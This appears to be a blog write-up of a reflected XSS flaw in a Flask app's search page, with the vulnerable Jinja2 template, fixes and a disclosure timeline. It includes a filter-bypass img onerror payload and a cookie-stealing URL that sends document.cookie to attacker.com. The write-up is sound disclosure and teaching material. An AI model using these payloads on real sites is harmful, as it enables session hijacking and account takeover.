---
title: "Reflected XSS in Search Function"
description: "Found a reflected XSS bug in a web app's search feature. Basic filter bypass with img onerror."
date: "2024-12-15"
tags: ["xss", "web", "writeup"]
---

## Background

Was testing a web application's search function and found it was reflecting user input without proper sanitization. Pretty standard reflected XSS.

Severity: High (CVSS 7.4)

## Finding It

The search endpoint looked like this:

```http
GET /search?q=test HTTP/1.1
Host: vulnerable-app.com
```

Response in HTML:

```html
<div class="search-results">
  <h2>Results for: test</h2>
</div>
```

Input was getting echoed back directly into the page.

## Exploitation

First tried the obvious payload:

```javascript
<script>alert('XSS')</script>
```

Blocked. They had some basic input validation catching script tags.

Tried an img tag instead:

```html
<img src=x onerror="alert('XSS')">
```

That worked. The filter was only looking for script tags, not event handlers.

### Working Payload

```javascript
https://vulnerable-app.com/search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

This sends the victim's cookies to an attacker-controlled server. From there you can hijack sessions, impersonate users, or just mess with their account.

## The Vulnerable Code

Backend was Flask:

```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)
```

Template:

```html
<div class="search-results">
  <h2>Results for: {{ query | safe }}</h2>
</div>
```

The `| safe` filter tells Jinja2 not to escape the input. Bad idea when you're dealing with user input.

## Fixes

Remove the safe filter:

```html
<h2>Results for: {{ query }}</h2>
```

Jinja2 will auto-escape by default. You can also add a CSP header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Or explicitly escape the input:

```python
import html

@app.route('/search')
def search():
    query = request.args.get('q', '')
    safe_query = html.escape(query)
    return render_template('search.html', query=safe_query)
```

## Timeline

- Dec 10: Found the bug
- Dec 10: Reported to vendor
- Dec 12: Vendor confirmed
- Dec 14: Fixed in production
- Dec 15: Publishing this writeup

## Notes

This is a pretty basic XSS bug. The filter was weak and only caught script tags. Always test multiple vectors when you hit input validation.

References:
- [OWASP XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
